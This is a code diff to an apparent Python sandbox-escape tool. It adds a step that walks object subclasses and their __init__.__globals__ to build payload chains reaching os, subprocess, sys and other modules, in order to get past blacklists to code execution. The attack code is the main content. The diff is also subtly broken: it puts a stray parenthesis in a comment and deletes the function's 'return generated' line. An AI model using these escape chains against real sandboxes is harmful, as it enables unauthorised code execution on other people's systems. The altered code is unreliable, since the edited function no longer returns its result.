@@ -289,8 +289,44 @@ Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
         try_to_restore('builtins2RCE', end_of_prog=True)
         
 
-    # Step9: Try to restore __import__
+    # Step9: T(ry to restore __import__
     try_to_restore('import', __import__.__class__)
+    
+    # Step10: Try coherent chain
+    if 'OBJECT' in tags:
+        logger.info('[*] Trying to find coherent chains.')
+        search = ['os', 'subprocess', 'uuid', 'pydoc', '_posixsubprocess',
+                'multiprocessing', '__builtins__', 'codecs', 'warnings',
+                'importlib', 'weakref', 'reprlib', 'sys']
+        search = {item: [] for item in search}
+        for index, i in enumerate(().__class__.__bases__[0].__subclasses__()):
+            try:
+                for j in search:
+                    if j in i.__init__.__globals__:
+                        object_path = generated_path['OBJECT']
+                        payload = f'{object_path}.__subclasses__()[{index}].__init__.__globals__["{j}"]'
+                        search[j].append(payload)
+            except AttributeError:
+                pass
+        for k in search:
+            payload = search[k]
+            if not payload:
+                continue
+            payload.sort(key=len)
+            payload_len = len(payload)
+            payload = payload[0]
+            output = exec_with_returns(payload, original_scope)
+            if type(output) == ModuleType:
+                tag = f'MODULE_{output.__name__}'
+            else:
+                tag = 'BUILTINS_SET'
+            tagged_scope[payload] = [output, tag]
+            tags.append(tag)
+            generated_path[tag] = payload
+            achivements[k] = [payload, payload_len]
+            logger.info(f'[+] Found coherent chain: {payload} -> {k}')
+    else:
+        logger.info('[*] No object found, skip coherent chains.')
 
     return bypasses_output(generated_path=generated_path)
 
@@ -326,4 +362,4 @@ def bypassRCE(
                            allow_unicode_bypass=allow_unicode_bypass,
                            depth=depth,
                            log_level=log_level)
-    return generated
+    
